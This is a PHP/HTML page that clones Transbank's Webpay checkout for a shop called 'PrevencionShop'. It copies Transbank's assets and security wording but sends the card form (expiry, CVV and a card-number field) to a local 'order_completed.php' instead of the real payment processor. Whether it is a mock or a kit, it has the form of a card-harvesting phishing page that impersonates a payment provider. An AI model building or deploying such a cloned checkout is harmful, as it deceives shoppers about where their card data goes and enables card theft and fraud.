<?php session_start(); ?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="language" content="es"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content=""><title>PrevencionShop | Pago seguro</title><!--<base href="./">--><base href="."><link href="./pago_seguro_webpay_files/css" rel="stylesheet"><link rel="preconnect" href="https://fonts.gstatic.com/"><link href="./pago_seguro_webpay_files/css2" rel="stylesheet"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/16x16.ico" sizes="16x16"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/32x32.ico" sizes="32x32"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/48x48.ico" sizes="48x48"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/64x64.ico" sizes="64x64"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/16x16.png" sizes="16x16"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/32x32.png" sizes="32x32"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/48x48.png" sizes="48x48"><link rel="shortcut icon" type="image/x-icon" href="https://webpay3g.transbank.cl/webpayserver/dist/assets/favicon/64x64.png" sizes="64x64"><script type="text/javascript" async="" src="./pago_seguro_webpay_files/analytics.js"></script><script async="" src="./pago_seguro_webpay_files/gtm.js"></script><script type="text/javascript" src="./pago_seguro_webpay_files/qrcode.js"></script><link href="./pago_seguro_webpay_files/styles.1eca41131808e37f44c3.bundle.css" rel="stylesheet"><style></style><script>function gtag(arguments){ if(window.google_tag_manager && arguments.event=="pagina-virtual"){window.google_tag_manager['GTM-KBGNBMV'].dataLayer.reset()}; window.dataLayer.push(arguments);}</script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-KBGNBMV');</script><style>.commerce-logo[_ngcontent-c14]   h5[_ngcontent-c14], .commerce-name[_ngcontent-c14]{text-overflow:ellipsis}.payment-options__info-e-commerce--pagar[_ngcontent-c14]{max-width:50%}.payment-options__info-e-commerce--inscribir[_ngcontent-c14]{max-width:100%}</style></head><body><app-root _nghost-c0="" ng-version="5.2.11">  <router-outlet _ngcontent-c0=""></router-outlet><app-home _nghost-c1=""><!----><main-panel _ngcontent-c1="" _nghost-c2=""><div _ngcontent-c2="" class="stripe stripe-sticky">
  <div _ngcontent-c2="" class="purple"></div>
  <div _ngcontent-c2="" class="pink"></div>
  <div _ngcontent-c2="" class="green"></div>
</div>

<app-header _ngcontent-c2="" _nghost-c9="">
    <header _ngcontent-c9="" class="header">
      <!--div _ngcontent-c9="" class="container">
        <img _ngcontent-c9="" alt="Webpay Transbank" class="header__brand" src="./pago_seguro_webpay_files/webpay-desktop-logo_color.svg">
      </div-->
  </header>
</app-header>

<main _ngcontent-c2="" class="container" role="main">
  <section _ngcontent-c2="" class="payment row payment--shadow">
    <left-panel _ngcontent-c2="" class="payment-options" _nghost-c10=""><div _ngcontent-c10="">
<app-comerce-detail _ngcontent-c10="" _nghost-c14=""><!----><div _ngcontent-c14="" class="payment-options__info">
  <div _ngcontent-c14="" class="payment-options__info-e-commerce payment-options__info-e-commerce--pagar">
    <!----><h3 _ngcontent-c14="">Estás pagando en:</h3>
    <!---->
    <!---->
    <div _ngcontent-c14="" class="commerce-logo">
      <h2 _ngcontent-c14="">PrevencionShop</h2>
      <!--img _ngcontent-c14="" src="./pago_seguro_webpay_files/LogoServlet" alt="AGUAS ANDINAS"-->
    </div>
    <h5 _ngcontent-c14="" class="commerce-name">PrevencionShop</h5>
    <!---->
  </div>
  <div _ngcontent-c14="" class="payment-options__info-amount">
    <h3 _ngcontent-c14="">Monto a pagar:</h3>
    <h5 _ngcontent-c14="" class="amount">$<?php echo $_SESSION['total_carrito'];?><!---->
    </h5>
  </div>
</div>
<!---->
<!---->

<!---->
</app-comerce-detail>
<!----><app-payment-select _ngcontent-c10="" _nghost-c15=""><div _ngcontent-c15="" class="payment-options__method">
  <!----><h3 _ngcontent-c15="">Selecciona tu medio de pago:</h3>
  <div _ngcontent-c15="" class="payment-options__method-items">
    <!---->
    <!---->
    <!----><button _ngcontent-c15="" app-payment-buttom="" class="payment-options__method-items-option payment-options__method-items-option--no-selected" id="debito" type="button" _nghost-c17=""><div _ngcontent-c17="" class="icon icon--debit"></div>
<!----><span _ngcontent-c17="">Débito</span>


</button>
    <!----><button _ngcontent-c15="" app-payment-buttom="" class="payment-options__method-items-option payment-options__method-items-option--selected" id="credito" type="button" _nghost-c17=""><div _ngcontent-c17="" class="icon icon--credit"></div>
<!----><span _ngcontent-c17="">Crédito</span>


</button>
    <!----><button _ngcontent-c15="" app-payment-buttom="" class="payment-options__method-items-option tooltipw payment-options__method-items-option--no-selected" id="qremv" type="button" _nghost-c17=""><div _ngcontent-c17="" class="icon icon icon--qr"></div>
<!----><span _ngcontent-c17="">y otras billeteras</span>


</button>
    <!----><button _ngcontent-c15="" app-payment-buttom="" class="payment-options__method-items-option payment-options__method-items-option--no-selected" id="prepago" type="button" _nghost-c17=""><div _ngcontent-c17="" class="icon icon--prepaid"></div>
<!----><span _ngcontent-c17="">Prepago</span>


</button>
  </div>
</div>



</app-payment-select>
<!----><app-anulation _ngcontent-c10="" _nghost-c8=""><!----><div _ngcontent-c8="" class="payment-options__return">
  <p _ngcontent-c8="">
    <!---->
    <!----><a _ngcontent-c8="" href="https://webpay3g.transbank.cl/webpayserver/dist/#"><span _ngcontent-c8="" class="arrow-back"></span> Anular compra y volver al comercio</a>
</p>
</div>

<!---->
</app-anulation>
<!----><app-footer _ngcontent-c10="" class="payment-footer" _nghost-c16=""><div _ngcontent-c16="" class="payment-options__security security">
  <img _ngcontent-c16="" alt="Seguridad" class="payment-options__security-icon" src="./pago_seguro_webpay_files/security.svg">
  <p _ngcontent-c16="">Esta transacción se está realizando bajo un sistema seguro, <a _ngcontent-c16="" target="_blank" href="https://www.tarifastransbank.cl/politicas-de-seguridad-y-privacidad.html">políticas de seguridad</a></p>
</div>
</app-footer>
</div>
</left-panel>
    <!----><right-panel _ngcontent-c2="" class="payment-checkout" _nghost-c11=""><!----><app-credit _ngcontent-c11="" class="payment-checkout__form" _nghost-c18=""><!---->
  
  <!-- Formulario de pago -->
    <form _ngcontent-c18="" method="post" action="./order_completed.php" autocomplete="off" class="payment-checkout__form ng-untouched ng-pristine ng-valid" novalidate="">
  <!----><app-tarjeta-credito _ngcontent-c18="" _nghost-c23=""><div _ngcontent-c23="" class="ng-untouched ng-pristine ng-invalid">
  
  <h3 _ngcontent-c23="" class="payment-checkout__title">Ingresa los datos de tu tarjeta: </h3>
  <div _ngcontent-c23="" class="card-number">
    <label _ngcontent-c23="" for="card-number">Número de tarjeta</label>
    <div _ngcontent-c23="" class="card-wrapper">
      <input _ngcontent-c23="" appformatcardnumber="" aria-describedby="card-number" class="card-input ng-untouched ng-pristine ng-invalid" formcontrolname="cardNumber" id="card-number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" size="16" type="tel">
      <span _ngcontent-c23="" class="card-logo">
        <!---->
        <!----><img _ngcontent-c23="" alt="Credit Card" onerror="" src="./pago_seguro_webpay_files/card-number-default.svg">
      </span>
      <!---->
    </div>
  </div>

  
  <div _ngcontent-c23="" class="payment-checkout__form-row">
    <div _ngcontent-c23="" class="card-exp">
      <label _ngcontent-c23="" for="card-exp">Fecha de expiración</label>
      <div _ngcontent-c23="" class="card-wrapper">
        <input _ngcontent-c23="" appformatexpirationdate="" aria-describedby="card-exp" class="card-input ng-untouched ng-pristine ng-invalid" formcontrolname="fechaExpiracion" id="card-exp" maxlength="5" name="fechaExpiracion" pattern="[0-9\/]*$" size="5" type="text" placeholder="MM/AA">
              <!---->
      </div>
    </div>

    
    <!----><div _ngcontent-c23="" class="card-cvv">
      <div _ngcontent-c23="" class="card-wrapper-flex">
        <label _ngcontent-c23="" for="card-cvv">CVV</label>
        <button _ngcontent-c23="" class="card-tooltip" tabindex="1" type="button"></button>
        <div _ngcontent-c23="" class="card-tooltip__content">
          <div _ngcontent-c23="" class="card-tooltip__content-info">
            <p _ngcontent-c23="">Ingresa los 3 dígitos al reverso de tu tarjeta.</p>
            <!----><img _ngcontent-c23="" alt="Ejemplo CVV" src="./pago_seguro_webpay_files/cvv.svg">
            <!---->
          </div>
          <div _ngcontent-c23="" class="card-tooltip__content-arrow"></div>
        </div>
      </div>
      <div _ngcontent-c23="" class="card-wrapper">
        <input _ngcontent-c23="" appformatcvvnumber="" aria-describedby="card-cvv" autocomplete="off" class="card-input ng-untouched ng-pristine ng-invalid" formcontrolname="cvv" id="card-cvv" name="cvv" pattern="[0-9]*$" placeholder="・・・" type="password" maxlength="3">
        <button _ngcontent-c23="" class="card-password-visibility" tabindex="1" type="button"></button>
        <!---->
      </div>
    </div>
  </div>

   <!---->
  <!---->
  <!---->

  <!---->

</div>

</app-tarjeta-credito>
  <!---->
  <!----><app-admin-shares _ngcontent-c18="" _nghost-c25=""><!----><div _ngcontent-c25="">
  <!----><div _ngcontent-c25="">

    <!----><app-selector-cuotas _ngcontent-c25="" _nghost-c31=""><!---->
<div _ngcontent-c31="" class="desktop ng-untouched ng-pristine ng-invalid">
  <!---->
  <div _ngcontent-c31="" class="payment-checkout__form-row">
    <div _ngcontent-c31="" class="card-installments-combobox">
      <label _ngcontent-c31="" for="card-installments-combobox">Cuotas</label>
      <div _ngcontent-c31="" class="card-wrapper">
        <button _ngcontent-c31="" class="combobox-button disabled" tabindex="0" type="button" disabled="" id="botonlistacuotas0">Sin Cuotas
        </button>
        <ul _ngcontent-c31="" class="combobox-list">
          <!----><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="0">
              Sin Cuotas
            </button>
          </li><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="3">
              3 cuotas
            </button>
          </li><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="6">
              6 cuotas
            </button>
          </li><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="12">
              12 cuotas
            </button>
          </li><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="24">
              24 cuotas
            </button>
          </li><li _ngcontent-c31="">
            <button _ngcontent-c31="" type="button" value="otraCuota">
              Otra cantidad 
            </button>
          </li>
        </ul>
      </div>
    </div>

    <!---->
    
    <!---->

  </div>

  
  <!---->

  
  <!---->


  <!---->

  <!---->

  <!---->
  <!---->
</div>
<!---->
</app-selector-cuotas>
    <!---->

  </div>
</div>
</app-admin-shares>
  <!----><button _ngcontent-c18="" class="submit">Pagar <!----> </button>
  <!---->
  <!---->
  <!---->
</form>
<!----><app-credit-card-brand _ngcontent-c18="" _nghost-c27=""><div _ngcontent-c27="" class="card-logos">
  <ul _ngcontent-c27="" class="card-logos__list">
    <!----><li _ngcontent-c27="" class="card-logos__list-item">
      <img _ngcontent-c27="" alt="VISA" src="./pago_seguro_webpay_files/visa.svg">
    </li>
    <!----><li _ngcontent-c27="" class="card-logos__list-item">
      <img _ngcontent-c27="" alt="Mastercard" src="./pago_seguro_webpay_files/master.svg">
    </li>
    <!----><li _ngcontent-c27="" class="card-logos__list-item">
      <img _ngcontent-c27="" alt="American Express" src="./pago_seguro_webpay_files/american.svg">
    </li>
    <!----><li _ngcontent-c27="" class="card-logos__list-item">
      <img _ngcontent-c27="" alt="Diners Club" src="./pago_seguro_webpay_files/dinners.svg">
    </li>
    <!----><li _ngcontent-c27="" class="card-logos__list-item">
      <img _ngcontent-c27="" alt="Magna" src="./pago_seguro_webpay_files/magna.svg">
    </li>
  </ul>
</div>
</app-credit-card-brand>

<app-anulation _ngcontent-c18="" style="display: none;" _nghost-c8=""><!----><div _ngcontent-c8="" class="payment-options__return">
  <p _ngcontent-c8="">
    <!---->
    <!----><a _ngcontent-c8="" href="https://webpay3g.transbank.cl/webpayserver/dist/#"><span _ngcontent-c8="" class="arrow-back"></span> Anular compra y volver al comercio</a>
</p>
</div>

<!---->
</app-anulation>
<!----><form _ngcontent-c18="" action="https://webpay3g.transbank.cl/webpayserver/bp_control.cgi" method="POST" ngnoform="" style="display: none;">
  <input _ngcontent-c18="" name="TBK_TIPO_TARJETA" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="TBK_NUMERO_TARJETA" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="cardChecked" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="TBK_MES_EXPIRACION" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="TBK_ANO_EXPIRACION" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="TBK_CVV" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="currentCommerceId" type="text" value="default"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserJavaEnabled" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserLanguage" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserColorDepth" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserScreenHeight" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserScreenWidth" type="text"><br _ngcontent-c18="">
  <input _ngcontent-c18="" name="browserTZ" type="text"><br _ngcontent-c18="">
  <!---->

  <!---->

  <!----><div _ngcontent-c18="">
    <!----><div _ngcontent-c18="">
      <!----><div _ngcontent-c18="">
        <input _ngcontent-c18="" type="text" name="TBK_TIPO_PAGO597033021348">
      </div>
      <!---->
      <br _ngcontent-c18="">

      <input _ngcontent-c18="" type="text" name="shares597033021348"><br _ngcontent-c18="">
    </div>
    <input _ngcontent-c18="" name="sharesRadio" type="text" value="on"><br _ngcontent-c18="">
  </div>
  <button _ngcontent-c18="" type="submit" value="Submit">Submit</button>
</form>

<!---->
</app-credit>
<!---->
<!---->
<!---->
<!---->
</right-panel>
    <!---->
  </section>
</main>
<app-commerce-detail-modal _ngcontent-c2="" _nghost-c13="">
<div _ngcontent-c13="" class="modal">
  <div _ngcontent-c13="" class="modal__dialog">
    <div _ngcontent-c13="" class="modal__content">
      <button _ngcontent-c13="" class="modal__close" type="button">×</button>
      <div _ngcontent-c13="" class="modal__header">
        <h3 _ngcontent-c13="">PrevencionShop <span _ngcontent-c13="" class="currency">$30.150 <!----></span></h3>
      </div>
      <div _ngcontent-c13="" class="modal__body">
        <ul _ngcontent-c13="" class="modal__body-details-list">
          <!----><li _ngcontent-c13="">
            <img _ngcontent-c13="" src="./pago_seguro_webpay_files/LogoServlet" alt="PrevencionShop">
            <span _ngcontent-c13="">PrevencionShop</span><span _ngcontent-c13="" class="amount">$30.150</span>
          </li>
        </ul>
      </div>
    </div>
  </div>
</div>
</app-commerce-detail-modal>
</main-panel>
<!---->
<app-modal-error _ngcontent-c1="" _nghost-c4="">
<div _ngcontent-c4="" class="modal">
  <div _ngcontent-c4="" class="modal__dialog">
    <!----><div _ngcontent-c4="" class="modal__content modal__content--error">
      <div _ngcontent-c4="" class="modal__header">
        <img _ngcontent-c4="" alt="Error" src="./pago_seguro_webpay_files/error.svg">
      </div>
      <!----><div _ngcontent-c4="" class="modal__body">
        <h4 _ngcontent-c4="">Tu transacción no se pudo llevar a cabo.</h4>
        <p _ngcontent-c4="">Ningún cargo fue realizado en tu tarjeta, <br>por favor <strong>intenta nuevamente.</strong></p>
        <button _ngcontent-c4="" type="button">Intentar nuevamente</button>
      </div>
      <!---->
    </div>
    <!---->
  </div>
</div>
</app-modal-error>
<app-modal-protagonismo-correo _ngcontent-c1="" _nghost-c5="">
<div _ngcontent-c5="" class="modal">
  <div _ngcontent-c5="" class="modal__dialog">
    <div _ngcontent-c5="" class="modal__content modal__content--error">
      <div _ngcontent-c5="" class="modal__header">
        <img _ngcontent-c5="" alt="Error" src="./pago_seguro_webpay_files/iconoAzul.svg">
      </div>
      <div _ngcontent-c5="" class="modal__body">
        <h4 _ngcontent-c5="">Tu seguridad es muy importante</h4>
        <p _ngcontent-c5="" class="texto__modalFraude">Ningún cargo fue realizado en tu tarjeta. Cancelaremos esta transacción y se creará un reporte de seguridad.</p>
        <div _ngcontent-c5="" class="cerrar">
          <a _ngcontent-c5="" href="javascript:void(0)">Reportar y cerrar</a>
        </div>
        <div _ngcontent-c5="" class="volver">
          <a _ngcontent-c5="" class="volver" href="javascript:void(0)">Volver</a>
        </div>
      </div>
    </div>
  </div>
</div>
<app-anulation _ngcontent-c5="" style="display: none;" _nghost-c8=""><!----><div _ngcontent-c8="" class="payment-options__return">
  <p _ngcontent-c8="">
    <!---->
    <!----><a _ngcontent-c8="" href="https://webpay3g.transbank.cl/webpayserver/dist/#"><span _ngcontent-c8="" class="arrow-back"></span> Anular compra y volver al comercio</a>
</p>
</div>

<!---->
</app-anulation>
</app-modal-protagonismo-correo>
<!---->
<!---->
<!---->


</app-home>
 </app-root>

</body>
</html>